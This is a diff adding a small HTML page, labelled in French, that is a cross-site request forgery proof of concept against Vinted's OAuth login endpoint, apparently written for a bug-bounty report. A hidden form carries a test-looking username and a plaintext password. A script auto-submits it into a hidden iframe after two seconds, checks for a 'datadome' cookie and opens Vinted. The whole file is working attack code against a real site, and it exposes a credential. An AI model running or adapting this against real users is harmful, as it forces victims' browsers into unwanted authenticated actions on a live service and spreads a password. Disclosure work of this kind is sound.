@@ -1,0 +1,35 @@
+<!-- csrf_no_captcha.html -->
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>CSRF sans Captcha</h2>
+    <p>Ouvrez cette page depuis un navigateur connecté à Vinted</p>
+    
+    <iframe name="h" style="display:none"></iframe>
+    
+    <form action="https://www.vinted.fr/web/api/auth/oauth" method="POST" target="h">
+        <input type="hidden" name="client_id" value="web">
+        <input type="hidden" name="scope" value="user">
+        <input type="hidden" name="username" value="raz_26+2@intigriti.me">
+        <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy">
+        <input type="hidden" name="grant_type" value="password">
+    </form>
+    
+    <button onclick="document.forms[0].submit()">Lancer CSRF</button>
+    
+    <script>
+        // Auto-submit après 2 secondes
+        setTimeout(() => {
+            console.log("Envoi CSRF depuis navigateur...");
+            console.log("Cookies envoyés automatiquement :", document.cookie.includes('datadome'));
+            document.forms[0].submit();
+            
+            // Vérification
+            setTimeout(() => {
+                window.open('https://www.vinted.fr', '_blank');
+                alert('CSRF envoyé ! Vérifiez Vinted.');
+            }, 1000);
+        }, 2000);
+    </script>
+</body>
+</html>
